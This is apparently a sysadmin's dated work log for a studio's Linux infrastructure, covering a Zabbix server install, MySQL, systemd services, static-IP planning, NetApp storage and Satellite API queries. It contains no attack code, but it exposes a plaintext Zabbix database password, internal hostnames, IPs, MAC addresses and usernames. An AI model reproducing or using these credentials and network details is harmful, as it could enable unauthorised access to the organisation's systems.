zabbix-server-2.4.5-1.el7.x86_64
zabbix-web-2.4.5-1.el7.noarch


ll /usr/share/doc | grep server
drwxr-xr-x.  2 root root    63 Feb 27 16:27 dleyna-server-0.5.0
drwxr-xr-x.  2 root root  4096 Mar  6 10:15 MariaDB-server-10.1.31
drwxr-xr-x.  2 root root    20 Feb 27 16:26 xorg-x11-server-common-1.19.3


@@@ yum erase MariaDB-server
@@@ rm -f /etc/yum.repos.d/MariaDb.repo

@@@ put in zabbix repo

rpm -ivh http://repo.zabbix.com/zabbix/3.4/rhel/7/x86_64/zabbix-release-3.4-2.el7.noarch.rpm

[root@monitor doc]# cat /etc/yum.repos.d/zabbix.repo 
[zabbix]
name=Zabbix Official Repository - $basearch
baseurl=http://repo.zabbix.com/zabbix/3.4/rhel/7/$basearch/
enabled=1
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-ZABBIX-A14FE591

[zabbix-non-supported]
name=Zabbix Official Repository non-supported - $basearch 
baseurl=http://repo.zabbix.com/non-supported/rhel/7/$basearch/
enabled=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-ZABBIX
gpgcheck=1

yum install zabbix-server-mysql

rpm -ql zabbix-release-3.4-2.el7.noarch
/etc/pki/rpm-gpg/RPM-GPG-KEY-ZABBIX
/etc/pki/rpm-gpg/RPM-GPG-KEY-ZABBIX-A14FE591
/etc/yum.repos.d/zabbix.repo
/usr/share/doc/zabbix-release-3.4
/usr/share/doc/zabbix-release-3.4/GPL

rpm -ql zabbix-release-3.4-2.el7.noarch
/etc/pki/rpm-gpg/RPM-GPG-KEY-ZABBIX
/etc/pki/rpm-gpg/RPM-GPG-KEY-ZABBIX-A14FE591
/etc/yum.repos.d/zabbix.repo
/usr/share/doc/zabbix-release-3.4
/usr/share/doc/zabbix-release-3.4/GPL
[root@monitor doc]# rpm -ql zabbix-server-mysql-3.4.7-1.el7.x86_64
/etc/logrotate.d/zabbix-server
/etc/zabbix/zabbix_server.conf
/usr/lib/systemd/system/zabbix-server.service
/usr/lib/tmpfiles.d/zabbix-server.conf
/usr/lib/zabbix/alertscripts
/usr/lib/zabbix/externalscripts
/usr/sbin/zabbix_server_mysql
/usr/share/doc/zabbix-server-mysql-3.4.7
/usr/share/doc/zabbix-server-mysql-3.4.7/AUTHORS
/usr/share/doc/zabbix-server-mysql-3.4.7/COPYING
/usr/share/doc/zabbix-server-mysql-3.4.7/ChangeLog
/usr/share/doc/zabbix-server-mysql-3.4.7/NEWS
/usr/share/doc/zabbix-server-mysql-3.4.7/README
/usr/share/doc/zabbix-server-mysql-3.4.7/create.sql.gz
/usr/share/man/man8/zabbix_server.8.gz
/var/log/zabbix
/var/run/zabbix

@@@ this is different....
@@@ /usr/share/doc/zabbix-server-mysql-3.4.7/create.sql.gz

yum install zabbix-web-mysql

rpm -qa | grep zabbix-web
zabbix-web-3.4.7-1.el7.noarch
zabbix-web-mysql-3.4.7-1.el7.noarch

rpm -ql zabbix-web-3.4.7-1.el7.noarch | wc -l
965

rpm -ql zabbix-web-mysql-3.4.7-1.el7.noarch
(contains no files)

@@@ HA

@@@ googled "zabbix-web-mysql rpm has no files"
https://tecadmin.net/install-zabbix-network-monitoring-on-centos-rhel-and-fedora/
@@@ says you have to install/configure httpd-devel, mysql-server, and php php-devel php-bcmath  php-pear php-gd php-mbstring php-mysql php-xml
@@@ first before starting teh zabbix part.   EF me


******************************************************************************************************
7Mar18 sgshipping
CHECK  ^^^^^^^^^^

httpd.service
shipping_trigger_prod.service
shipping_trigger_stage.service
TY Amy!!!

@@@ all 3 were not enabled (they are now)
******************************************************************************************************
8Mar18 vmmailhub
       ^^^^^^^^^
flush DNS because the IP changed

[root@vmmailhub ~]# systemctl start zabbix-agent
Job for zabbix-agent.service failed because a configured resource limit was exceeded. See "systemctl status zabbix-agent.service" and "journalctl -xe" for details.

 1052  mkdir /run/zabbix
 1053  chown zabbix.zabbix /run/zabbix/
 1054  ll /run
 1055  systemctl start zabbix-agent
 1056  systemctl status zabbix-agent

******************************************************************************************************
8Mar18 vmmailhub  found commands

mailq

mailq -q

postqueue -f

nslookup
set type=mx
disneytoonstudios.com

https://www.godaddy.com/help/how-to-analyze-postfix-mail-logs-12130

man postconf


******************************************************************************************************
9Mar18  axiom fiber inventory  (stealing fiber ports for ESXi machines)

                   Health  Throughput (bps)  HDD Storage      SSD Storage
ID |IP Address     |DASR |  In   Out  Total| Used / Size     |Used / Size
-------------------+-----+-----+-----+-----+-----------------+-----------------
  1|10.103.83.187  | OK  |    0| 3.4M| 3.4M| 2.5T/  60T(  4%)|  10G/ 1.1T(< 1%)
  2|10.103.83.188  | OK  | 832K|    0| 832K| 2.5T/  60T(  4%)|  10G/ 1.1T(< 1%)
  3|10.103.83.189  | OK  |    0| 246K| 246K| 2.5T/  60T(  4%)|  10G/ 1.1T(< 1%)
  5|10.103.83.191  | OK  |    0| 2.1M| 2.1M| 2.5T/  60T(  4%)|  10G/ 1.1T(< 1%)
>>>>>  6|10.103.83.192  |-A-- |    0| 2.1M| 2.1M| 2.5T/  60T(  4%)|  10G/ 1.1T(< 1%)
  7|10.103.83.184  | OK  |    0|    0|    0| 2.5T/  60T(  4%)|  10G/ 1.1T(< 1%)
>>>>>  8|10.103.83.185  |-A-- |    0|  26K|  26K| 2.5T/  60T(  4%)|  11G/ 1.1T(< 1%)
>>>>>  9|10.103.83.186  |-A-- |    0|  33K|  33K| 2.5T/  60T(  4%)|  10G/ 1.1T(< 1%)
>>>>> 10|10.103.83.193  |-A-- |    0| 5.2M| 5.2M| 2.4T/  60T(  4%)|  11G/ 1.1T(< 1%)
 99|10.103.83.183  | OK  | 4.0K| 2.6M| 2.6M|             (Diskless)            
-------------------+-----+-----+-----+-----+-----------------+-----------------
Cluster Totals:          | 836K|  16M|  16M|  22T/ 536T(  4%)|  93G/ 9.7T(< 1%)


******************************************************************************************************
12MAr18   how to find what SHOULD be running on a systemd machine

[root@monitor ~]# ll /etc/systemd/system/multi-user.target.wants/
total 0
lrwxrwxrwx. 1 root root 41 Mar  8 11:32 abrt-ccpp.service -> /usr/lib/systemd/system/abrt-ccpp.service
lrwxrwxrwx. 1 root root 37 Mar  8 11:32 abrtd.service -> /usr/lib/systemd/system/abrtd.service
lrwxrwxrwx. 1 root root 41 Mar  8 11:32 abrt-oops.service -> /usr/lib/systemd/system/abrt-oops.service
lrwxrwxrwx. 1 root root 43 Mar  8 11:32 abrt-vmcore.service -> /usr/lib/systemd/system/abrt-vmcore.service
lrwxrwxrwx. 1 root root 41 Mar  8 11:32 abrt-xorg.service -> /usr/lib/systemd/system/abrt-xorg.service
lrwxrwxrwx. 1 root root 35 Mar  8 11:06 atd.service -> /usr/lib/systemd/system/atd.service
lrwxrwxrwx. 1 root root 38 Mar  8 11:06 auditd.service -> /usr/lib/systemd/system/auditd.service
lrwxrwxrwx. 1 root root 38 Mar  8 11:10 autofs.service -> /usr/lib/systemd/system/autofs.service
lrwxrwxrwx. 1 root root 44 Mar  8 11:29 avahi-daemon.service -> /usr/lib/systemd/system/avahi-daemon.service
lrwxrwxrwx. 1 root root 39 Mar  8 11:34 chronyd.service -> /usr/lib/systemd/system/chronyd.service
lrwxrwxrwx. 1 root root 37 Mar  8 11:05 crond.service -> /usr/lib/systemd/system/crond.service
lrwxrwxrwx. 1 root root 33 Mar  8 11:30 cups.path -> /usr/lib/systemd/system/cups.path
lrwxrwxrwx. 1 root root 36 Mar  8 11:30 cups.service -> /usr/lib/systemd/system/cups.service
lrwxrwxrwx. 1 root root 38 Mar  8 11:34 goferd.service -> /usr/lib/systemd/system/goferd.service
lrwxrwxrwx. 1 root root 35 Mar  8 11:34 gpm.service -> /usr/lib/systemd/system/gpm.service
lrwxrwxrwx. 1 root root 37 Mar 12 11:48 httpd.service -> /usr/lib/systemd/system/httpd.service
lrwxrwxrwx. 1 root root 42 Mar  8 11:06 irqbalance.service -> /usr/lib/systemd/system/irqbalance.service
lrwxrwxrwx. 1 root root 37 Mar  8 11:06 kdump.service -> /usr/lib/systemd/system/kdump.service
lrwxrwxrwx. 1 root root 46 Mar  8 11:29 libstoragemgmt.service -> /usr/lib/systemd/system/libstoragemgmt.service
lrwxrwxrwx. 1 root root 41 Mar  8 11:30 mdmonitor.service -> /usr/lib/systemd/system/mdmonitor.service
lrwxrwxrwx. 1 root root 46 Mar  8 11:06 NetworkManager.service -> /usr/lib/systemd/system/NetworkManager.service
lrwxrwxrwx. 1 root root 58 Mar  8 11:10 NetworkManager-wait-online.service -> /usr/lib/systemd/system/NetworkManager-wait-online.service
lrwxrwxrwx. 1 root root 41 Mar  8 11:06 nfs-client.target -> /usr/lib/systemd/system/nfs-client.target
lrwxrwxrwx. 1 root root 36 Mar  8 11:22 ntpd.service -> /usr/lib/systemd/system/ntpd.service
lrwxrwxrwx. 1 root root 39 Mar  8 11:59 oddjobd.service -> /usr/lib/systemd/system/oddjobd.service
lrwxrwxrwx. 1 root root 39 Mar  8 11:06 postfix.service -> /usr/lib/systemd/system/postfix.service
lrwxrwxrwx. 1 root root 38 Mar  8 11:16 puppet.service -> /usr/lib/systemd/system/puppet.service
lrwxrwxrwx. 1 root root 40 Mar  8 11:05 remote-fs.target -> /usr/lib/systemd/system/remote-fs.target
lrwxrwxrwx. 1 root root 36 Mar  8 11:35 rngd.service -> /usr/lib/systemd/system/rngd.service
lrwxrwxrwx. 1 root root 39 Mar  8 11:06 rsyslog.service -> /usr/lib/systemd/system/rsyslog.service
lrwxrwxrwx. 1 root root 38 Mar  8 11:34 smartd.service -> /usr/lib/systemd/system/smartd.service
lrwxrwxrwx. 1 root root 36 Mar  8 11:06 sshd.service -> /usr/lib/systemd/system/sshd.service
lrwxrwxrwx. 1 root root 36 Mar  8 11:22 sssd.service -> /usr/lib/systemd/system/sssd.service
lrwxrwxrwx. 1 root root 39 Mar  8 11:34 sysstat.service -> /usr/lib/systemd/system/sysstat.service
lrwxrwxrwx. 1 root root 37 Mar  8 11:06 tuned.service -> /usr/lib/systemd/system/tuned.service
lrwxrwxrwx. 1 root root 40 Mar  8 11:57 vmtoolsd.service -> /usr/lib/systemd/system/vmtoolsd.service
lrwxrwxrwx. 1 root root 44 Mar  8 11:58 zabbix-agent.service -> /usr/lib/systemd/system/zabbix-agent.service


*****************************************************************************************************
12Mar18  zabbix install history

@@@ fresh install of monitor.disneytoonstudios.com
@@@ and den

https://tecadmin.net/install-zabbix-network-monitoring-on-centos-rhel-and-fedora/

   11  yum install httpd httpd-devel
   12  yum install mysql mysql-server
   13  yum install php php-devel php-bcmath  php-pear php-gd php-mbstring php-mysql php-xml
   14  systemctl start httpd
   15  systemctl enable httpd
   16  systemctl start mariadb
   17  systemctl start mysql
   18  ps -ef | grep mysql
   19  ps -ef | grep maria
   20  rpm -qa | grep maria
   21  rpm -ql mariadb-5.5.56-2.el7.x86_64
   22  ll /lib/systemd/system
   23  ll /lib/systemd/system | grep db
   24  ll /etc/systemd/system
   25  ll /etc/systemd/system/multi-user.target.wants/
   26  ll /usr/lib/systemd/system/
   27  ll /usr/lib/systemd/system/multi-user.target
   28  ll /usr/lib/systemd/system/multi-user.target.wants/
   29  yum list | grep mysql
   30  yum install mysql55-mysql-server.x86_64
   31  ll /usr/lib/systemd/system/multi-user.target.wants/
   32  ll /usr/lib/systemd/system/
   33  systemctl start mysql55-mysqld.service
   34  systemctl enable mysql55-mysqld.service
   35  mysql_secure_installation
   36  which mysql
   37  rpm -ql mysql55-mysqld
   38  rpm -ql mysql55-mysqld-server
   39  rpm -qa \ grep mysql
   40  rpm -qa | grep mysql
   41  rpm -ql mysql55-mysql-server-5.5.52-1.el7.x86_64
   42  rpm -ql mysql55-mysql-server-5.5.52-1.el7.x86_64 | grep secure
   43  /opt/rh/mysql55/root/usr/bin/mysql_secure_installation
   44  rpm -Uvh http://repo.zabbix.com/zabbix/3.4/rhel/7/x86_64/zabbix-release-3.4-2.el7.noarch.rpm
   45  yum install zabbix-server-mysql zabbix-web-mysql zabbix-proxy-mysql
   46  vim /etc/httpd/conf.d/zabbix.conf
   47  systemctl restart httpd
   48  mysql -u root -p
   49  zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uroot -p zabbixdb
   50  zcat /usr/share/doc/zabbix-proxy-mysql*/schema.sql.gz | mysql -uroot -p zabbixdb
@@@ database was named zabbixdb and I wanted it to match existing database "zabbix"
@@@ mysql > drop database zabbixdb;
@@@ mysql > CREATE DATABASE zabbix CHARACTER SET UTF8;
@@@ mysql > GRANT ALL PRIVILEGES on zabbix.* to zabbix@localhost IDENTIFIED BY 'Ti...';
@@@ mysql> FLUSH PRIVILEGES;
@@@ mysql> quit
   51  vim /etc/zabbix/zabbix_server.conf
   52  service zabbix-server start
   53  mysql -u root -p
   54  zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uroot -p zabbix;
   55  zcat /usr/share/doc/zabbix-proxy-mysql*/schema.sql.gz | mysql -uroot -p zabbix;
   56  vim etc/zabbix/zabbix_server.conf 
   57  vim /etc/zabbix/zabbix_server.conf 
   58  service zabbix-server restart
   59  history
[root@monitor ~]# 

@@@ cp 12Mar18 copy of zabbix DB (from backup dump)

[root@mayday tmp]# scp /DB/mariadb/10.0/p3306/backups/zabbix.sql monitor:/tmp


******************************************************************************************************
12Mar18 snapshot saves the day

cd /disney/home/dsiegfriedt/.snapshot/
@@@ pick from there

******************************************************************************************************
13Mar18  restart mysql on monitor (new zabbix server)

[root@monitor ~]# systemctl restart mysql55-mysqld.service

systemctl status mysql55-mysqld.service

@@@ point vmprism11 at monitor
[root@vmprism11 ~]# cat /etc/zabbix/zabbix_agentd.conf  | grep monitor
Server=monitor
ServerActive=monitor
Hostname=monitor

[root@vmprism11 ~]# systemctl restart zabbix-agent


******************************************************************************************************
13Mar18  vmwinfmp

paused on 5Mar18 on the LAST RHEV machine.


******************************************************************************************************
13Mar18  delete and re-add oljammer from satellite
	 check idm... no entries for oljammer

******************************************************************************************************
13Mar18  disneytoonstudios.com FAILS www.disneytoonstudios.com
	 @@@ in DNS
	 "@" pointed to (with IP) gitlab-stage (10.106.228.25)
@@@ Joel suspects that when "dtsweb" moved the new IP was not updated in DNS root (@)
@@@ when he put the new IP for dtsweb (10.106.230.181) ...it worked and contiunues to.



*********************
WE NEED TO HAVE STATIC IPs FOR ALL SERVERS
*********************


******************************************************************************************************
15Mar18   service file from Justin for Autodesk

cat Downloads/nlrs.service 
[Unit]
Description=Autodesk Network License Manager
After=network.target

[Service]
ExecStart=/opt/flexnetserver/lmgrd -z -c /opt/flexnetserver/license.lic -l /opt/flexnetserver/debug.log

[Install]
WantedBy=multi-user.target

cat Downloads/cars.service 
[Unit]
Description=Autodesk Reporting Service
After=nlrs.service
BindsTo=nlrs.service

[Service]
WorkingDirectory=/opt/Autodesk/NLRS/
PIDFile=/tmp/CARService.exe.lock
ExecStart=/opt/mono-3.12.1/bin/mono-service --no-daemon CARService.exe
Restart=always

[Install]
WantedBy=multi-user.target


******************************************************************************************************
15Mar18  machines the need static IPs   (not in this order)

<DBs>
  vmmariadb1+2
  vmcodadb1+2
  vmbackupdb
  vmpostgres1+2

<HTTPs>

<mail>
  vmmailhub
  jarvis
  whiplash

<namespace>
idm01-4
DTSAD

<VMWare hosts>
-
|ned
|leadbottom
|roper
|oljammer
-

<infrastucture>
mayday
chug

bulldog???

<license>
dipper 
dipper2
deadline10

To start we will (THANKS Joel/Grace!!!) set in DHCP some machine to have existing IP assigned to them.   Done in DHCP.conf by putting mac address with the IPs.  A config change with no interruption to the machines.

2nd phaze will be to carve a VLAN for static IPs

3rd will be to migrate machines to the new static IP 
  

http://confluence.disneytoonstudios.com/display/TEC/Static+IPs+for+the+DataCenter


******************************************************************************************************
15Mar18   alerts on volume "vsphere_prod"
@@@ added 500g

nest-admin.disneytoonstudios.com

nest::> vol size vsphere_prod
vol size: Volume "nest_nfs:vsphere_prod" has size 3t.                          

nest::> df vsphere_prod      
Filesystem              kbytes       used      avail capacity  Mounted on                 Vserver
/vol/vsphere_prod/  3060164200 2645742480  414421720      86%  /nest/vsphere_prod         nest_nfs
/vol/vsphere_prod/.snapshot 161061272 814196492    0     506%  /nest/vsphere_prod/.snapshot  nest_nfs
2 entries were displayed.

nest::> df -A aggr1_01
Aggregate               kbytes       used      avail capacity
aggr1_01            9474984816 8399168120 1075816696      89%
aggr1_01/.snapshot           0          0          0       0%
2 entries were displayed.

nest::> df -A aggr1_02 
Aggregate               kbytes       used      avail capacity
aggr1_02            9474984816 3344891612 6130093204      35%
aggr1_02/.snapshot           0          0          0       0%
2 entries were displayed.

nest::> vol size vsphere_prod
vol size: Volume "nest_nfs:vsphere_prod" has size 3t.                          

nest::> vol size vsphere_prod +500g
vol size: Volume "nest_nfs:vsphere_prod" size set to 3.49t.                    


nest::> vol size vsphere_prod      
vol size: Volume "nest_nfs:vsphere_prod" has size 3.49t.                       


******************************************************************************************************
16Mar18  setting up ilo

power on => F9 => System Configuration => ilo => User => Edit

@@@ set
login: admin
passwd: <book/encryptedfile> 

******************************************************************************************************
16Mar18  mayday

stopped/disabled vmtoolsd
stopped/disabled puppet (per Grace)

[root@mayday ~]# cat /etc/zabbix/zabbix_server.conf | grep -v "#" | sed /^$/d
      ^^^^^^                            ^^^^^^
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
DebugLevel=3
PidFile=/var/run/zabbix/zabbix_server.pid
DBName=zabbix
DBUser=zabbix
DBPassword=zabbix
DBSocket=/var/lib/mysql/mysql.sock
SNMPTrapperFile=/var/log/snmptt/snmptt.log
CacheSize=512M
CacheUpdateFrequency=15
ValueCacheSize=512M
Timeout=15
UnreachablePeriod=90
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts


[root@mayday ~]# cat /etc/zabbix/zabbix_agentd.conf | grep -v "#" | sed /^$/d
      ^^^^^^                            ^^^^^^
PidFile=/var/run/zabbix/zabbix_agentd.pid
LogFile=/var/log/zabbix/zabbix_agentd.log
LogFileSize=300
DebugLevel=3
EnableRemoteCommands=1
LogRemoteCommands=1
Server=mayday
ServerActive=mayday
Hostname=mayday
Include=/etc/zabbix/zabbix_agentd.d/

UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU

[root@monitor zabbix]# cat /etc/zabbix/zabbix_server.conf | grep -v "#" | sed /^$/d
      ^^^^^^^                                 ^^^^^^
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/var/run/zabbix/zabbix_server.pid
SocketDir=/var/run/zabbix
DBHost=localhost
DBName=zabbix
DBUser=zabbix
DBPassword=Tiacstntbc
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
CacheSize=512M
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
LogSlowQueries=3000

[root@monitor zabbix]# cat /etc/zabbix/zabbix_agentd.conf | grep -v "#" | sed /^$/d
      ^^^^^^^                                 ^^^^^^
PidFile=/var/run/zabbix/zabbix_agentd.pid
LogFile=/var/log/zabbix/zabbix_agentd.log
LogFileSize=300
DebugLevel=3
EnableRemoteCommands=1
LogRemoteCommands=1
Server=monitor
ServerActive=monitor
Hostname=monitor
Include=/etc/zabbix/zabbix_agentd.d/*.conf

@@@ afterlunch
ll /disney/share/deadline/Repository10

@@@jobs has all the job info.   speaking with Ree.... if I link /disney/share/deadline/Repository10/jobs/ to /disney/apps/deadline/Deadline10/Deadline-10.0.9.7/jobs/ we can see if that changes the help message.

******************************************************************************************************
19Mar18  rebuild oljammer

Highlight "Production Cluster" => Rt click => Add Host

******************************************************************************************************
20Mar18  backup-ipa

@@@ stopped on idm01 and we can't remember why.  Setting it up on idm04

[root@idm01 ~]# cat /root/backup-ipa.bash 
#!/bin/bash
# --siggy 19Jun17 use ipa-backup for backing up IDM01

TODAY=`date +%C%y"-"%m"-"%e`

cd /var/lib/ipa/
find . -local -type d -atime +3 -exec rm -rf '{}' ':'

/usr/sbin/ipa-backup --logs

cp -r backup/ipa-full-$TODAY/* /disney/depts/tech/systems/backops/idm/

cd /disney/depts/tech/systems/backops/idm/

find . -local -type d -atime +3 -exec rm -rf '{}' ':'

******************************************************************************************************
20Mar18  removed

vmdeadline # had to dis-associate first
deadline

******************************************************************************************************
21Mar18  oljammer vSphere HA agent cannot be correctly installed or configured

https://kb.vmware.com/s/article/1008025

******************************************************************************************************
22Mar18 Ree says that some of the floor machines are not starting deadline on boot

@@@ still lots of deadline8 cruft

went through ~/JOBS/DISNEYTS/DEADLINE/desktop-list with teh following commands.

systemctl status deadline10launcher
systemctl is-enabled deadline10launcher
chkconfig --list
chkconfig --del deadline8launcher
rm -f /etc/init.d/deadline8launcher 
ll /opt/Thinkbox/

******************************************************************************************************
28Mar18  bulldog info (208/??)

[root@bulldog ~]# crontab -l
#* * * * * /disney/home/stevec/scripts/get_powertemp.csh pwr207.swna.wdpr.disney.com > /tmp/pwr207_temp.out 2> /tmp/pwr207_temp.err

^^^^^
[root@bulldog ~]# cat /disney/home/stevec/scripts/get_powertemp.csh
#!/bin/csh

set myhost = $1

if ($myhost == "") then
    echo "No hostname supplied"
    exit
endif

set temp=`/usr/bin/snmpget -Os -c public -v 1 pwr207.swna.wdpr.disney.com 1.3.6.1.4.1.1718.3.2.5.1.6.1.1`

echo $temp | awk '{print$4}'
^^^^^

[root@bulldog ~]# ll /var/spool/cron/
total 4
-rw-------. 1 root root 132 Dec 22  2016 root

[root@bulldog ~]# cat /disney/home/stevec/scripts/get_powertemp.csh
#!/bin/csh

set myhost = $1

if ($myhost == "") then
    echo "No hostname supplied"
    exit
endif

set temp=`/usr/bin/snmpget -Os -c public -v 1 pwr207.swna.wdpr.disney.com 1.3.6.1.4.1.1718.3.2.5.1.6.1.1`

echo $temp | awk '{print$4}'
@@@ which doesn't work... probably why it is commented out.

[root@bulldog ~]# cat /etc/fstab

# nfs mount for vm backups
lemma:/ifs/data/no_snap/rhev-backups /mnt/rhev-backups-lemma  nfs defaults    0 0
theorem:/ifs/data/no_snap/vm_backup_01/rhev-backups /mnt/rhev-backups  nfs defaults    0 0

@@@ leemma does not exist (as far as I can tell)

@@@ what I did rather than powering it off.....
umount /mnt/rhev-backups
systemctl stop httpd


******************************************************************************************************
29Mar18  collecting information from satellite from a command line

https://access.redhat.com/solutions/1140893

@@@ RHEV Hypervisors
curl -X GET -s -k -u dsiegfriedt https://satellite.disneytoonstudios.com/api/v2/hosts?search=model=\"RHEV+Hypervisor\" | python -mjson.tool

@@@ G7
curl -X GET -s -k -u dsiegfriedt https://satellite.disneytoonstudios.com/api/v2/hosts?search=model=\"ProLiant+DL380+G7\" | python -mjson.tool

@@@ G8

curl -X GET -s -k -u dsiegfriedt https://satellite.disneytoonstudios.com/api/v2/hosts?search=model=\"ProLiant+DL380p+Gen8\" | python -mjson.tool

@@@ G9

curl -X GET -s -k -u dsiegfriedt https://satellite.disneytoonstudios.com/api/v2/hosts?search=model=\"ProLiant+DL380+Gen9\" | python -mjson.tool

@@@ G9 machines by name
curl -X GET -s -k -u dsiegfriedt https://satellite.disneytoonstudios.com/api/v2/hosts?search=model=\"ProLiant+DL380+Gen9\" | python -mjson.tool | grep disneytoonstudios.com | grep -v domain_name | grep -v certname | grep name
Enter host password for user 'dsiegfriedt':
            "name": "atlas.disneytoonstudios.com",
            "name": "bladeranger.disneytoonstudios.com",
            "name": "chug.disneytoonstudios.com",
            "name": "crophopper.disneytoonstudios.com",
            "name": "idm01.disneytoonstudios.com",
            "name": "idm02.disneytoonstudios.com",
            "name": "leadbottom.disneytoonstudios.com",
            "name": "mungo.disneytoonstudios.com",
            "name": "ned.disneytoonstudios.com",
            "name": "oljammer.disneytoonstudios.com",
            "name": "ripslinger.disneytoonstudios.com",
            "name": "roper.disneytoonstudios.com",
            "name": "shipper.disneytoonstudios.com",
            "name": "skipper.disneytoonstudios.com",
            "name": "smokejumper.disneytoonstudios.com",
            "name": "stevectest.disneytoonstudios.com",
            "name": "windlifter.disneytoonstudios.com",

@@@ G8 machines by name
curl -X GET -s -k -u dsiegfriedt https://satellite.disneytoonstudios.com/api/v2/hosts?search=model=\"ProLiant+DL380p+Gen8\" | python -mjson.tool | grep disneytoonstudios.com | grep -v domain_name | grep -v certname | grep name
Enter host password for user 'dsiegfriedt':
            "name": "dipper.disneytoonstudios.com",

@@@ G7 machines by name
curl -X GET -s -k -u dsiegfriedt https://satellite.disneytoonstudios.com/api/v2/hosts?search=model=\"ProLiant+DL380+G7\" | python -mjson.tool | grep disneytoonstudios.com | grep -v domain_name | grep -v certname | grep name
Enter host password for user 'dsiegfriedt':
            "name": "aspera.disneytoonstudios.com",
            "name": "avid-nbu.disneytoonstudios.com",
            "name": "bulldog.disneytoonstudios.com",
            "name": "gracie-esxi-labhost1.disneytoonstudios.com",
            "name": "gruf.disneytoonstudios.com",
            "name": "mayday.disneytoonstudios.com",
            "name": "vsphere-dev-02.disneytoonstudios.com",


@@@ so we have a total of 25 hardware servers... acording to satellite.
@@@ missing ryker and cabbie (or as Grace has renamed them vsphere-prod3+4)

******************************************************************************************************
2Apr18  nest networking...is it DHCP?

host fas8020a-sp.disneytoonstudios.com {
  dynamic;
  hardware ethernet 00:a0:98:68:5f:30;
  fixed-address 10.106.239.18;
host fas8020b-sp.disneytoonstudios.com {
  dynamic;
  hardware ethernet 00:a0:98:68:7b:6d;
  fixed-address 10.106.239.20;


dsiegfriedt@dts3329:~ $ ssh admin@FAS8020A-SP

admin@fas8020a-sp's password: 
X11 forwarding request failed on channel 0
SP nest-01> system console
Type Ctrl-D to exit.
SP-login: root
Password:
Login incorrect
SP-login: root
Password:
Login incorrect
SP-login: admin
Password:
*****************************************************
* This is an SP console session. Output from the    *
* serial console is also mirrored on this session.  *
*****************************************************
nest::> ?
nest::> network
nest::network> ?
nest::network> interface
nest::network interface> ?

nest::network interface> show
            Logical    Status     Network            Current       Current Is
Vserver     Interface  Admin/Oper Address/Mask       Node          Port    Home
----------- ---------- ---------- ------------------ ------------- ------- ----
Cluster
            nest-01_clus1 
                         up/up    169.254.211.223/16 nest-01       e0a     true
            nest-01_clus2 
                         up/up    169.254.30.197/16  nest-01       e0b     true
            nest-02_clus1 
                         up/up    169.254.215.64/16  nest-02       e0a     true
            nest-02_clus2 
                         up/up    169.254.34.38/16   nest-02       e0b     true
nest
            cluster_mgmt up/up    10.106.228.132/22  nest-01       e0c     true
            nest-01_mgmt1 
                         up/up    10.106.239.19/24   nest-01       e0M     true
            nest-02_mgmt1 
                         up/up    10.106.239.26/24   nest-02       e0M     true
nest_nfs
            nest-01_nfs1 up/up    10.106.231.190/22  nest-01       e0c     true
            nest-01_nfs2 up/up    10.106.231.191/22  nest-01       e0d     true
            nest-02_nfs1 up/up    10.106.231.192/22  nest-02       e0c     true
            nest-02_nfs2 up/up    10.106.231.193/22  nest-02       e0d     true
11 entries were displayed.                                                     



******************************************************************************************************
3Apr18  kafka/prism from James

http://prodman.disneytoonstudios.com:9021/summary.html

******************************************************************************************************
4Apr18  vmprism configuration file lives in 

/disney/config/prism/site.json

Jordi
/opt/kafka/config/kafka.properties are wrong. It should be owned by user prism and group prodctn.

@@@ BAD
systemctl status kafka -l

@@@ GOOD
service kafka status


@@@ working now.   Going through and collecting info on all the dirs we touched

[root@vmprism05 ~]# ll /opt/kafka/config/
total 32
-rw-r--r--. 1 root  root    1202 Oct 14  2015 consumer.properties
-rw-r--r--. 1 prism prodctn 5999 Apr  4 10:59 kafka.properties
-rw-r--r--. 1 root  root    4307 Oct 14  2015 log4j.properties
-rw-r--r--. 1 root  root    2217 Oct 14  2015 producer.properties
-rw-r--r--. 1 root  root    3326 Oct 14  2015 test-log4j.properties
-rw-r--r--. 1 root  root     995 Oct 14  2015 tools-log4j.properties

[root@vmprism05 ~]# ll /disk1/scratch/
total 59276
-rw-r--r--. 1 root    root         932 Sep 18  2015 DISK1_SCRATCH_POLICY.txt
drwxr-xr-x. 6 prism   users       4096 Apr  4 13:34 kafka-logs
drwxrwxr-x. 7 nbarber nbarber     4096 Mar 14  2016 kafka-web-console-2.1.0-SNAPSHOT
-rw-r--r--. 1 nbarber users   60683838 Oct 21  2014 kafka-web-console-2.1.0-SNAPSHOT.zip
drwxrwxrwx. 3 root    root          33 Oct 14  2015 zookeeper

[root@vmprism05 ~]# ll /disk1/scratch/kafka-logs/
total 8
drwxr-xr-x. 2 prism users   70 Apr  3 15:22 bean_topic-0
drwxr-xr-x. 2 prism users   70 Oct 14  2015 bean_topic-1
drwxr-xr-x. 2 prism users   70 Apr  4 11:00 pes-0
drwxr-xr-x. 2 prism users   70 Apr  4 11:00 pes-1
-rw-r--r--. 1 prism prodctn 60 Apr  4 13:34 recovery-point-offset-checkpoint
-rw-r--r--. 1 prism prodctn 60 Apr  4 13:34 replication-offset-checkpoint

[root@vmprism05 ~]# ll /disk1/scratch/kafka-logs/pes-0
total 768
-rw-r--r--. 1 prism prodctn 10485760 Apr  4 13:14 00000000000000117717.index
-rw-r--r--. 1 prism prodctn   780278 Apr  4 13:14 00000000000000117717.log

[root@vmprism05 ~]# ll /disney/config/prism/site.json
-rw-r--r--. 1 nbarber users 3904 Apr  4 10:54 /disney/config/prism/site.json

[root@vmprism05 ~]# cp /disney/config/prism/site.json /disney/home/dsiegfriedt/JOBS/DISNEYTS/PRISM/

@@@ also copied part of root's history to my PRISM directory
/disney/home/dsiegfriedt/JOBS/DISNEYTS/PRISM/4Apr18-vmprism05-history-part.txt

email thread kept as IMPORTANT tech stuff and Record... started 3Apr18

5Apr18 from SYSENG471

